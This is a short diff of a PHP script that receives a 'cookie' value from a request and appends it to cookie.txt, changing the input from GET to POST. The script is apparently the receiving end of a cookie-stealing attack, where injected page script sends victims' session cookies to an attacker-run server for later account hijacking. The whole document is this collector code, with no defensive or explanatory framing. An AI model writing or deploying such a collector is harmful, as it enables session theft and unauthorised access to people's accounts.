@@ -1,6 +1,6 @@
 <?php
-if(isset($_GET['cookie'])){
-    $cookie = $_GET['cookie'];
+if(isset($_POST['cookie'])){
+    $cookie = $_POST['cookie'];
     $f = fopen('cookie.txt','a');
     fwrite($f,$cookie);
     fclose($f);
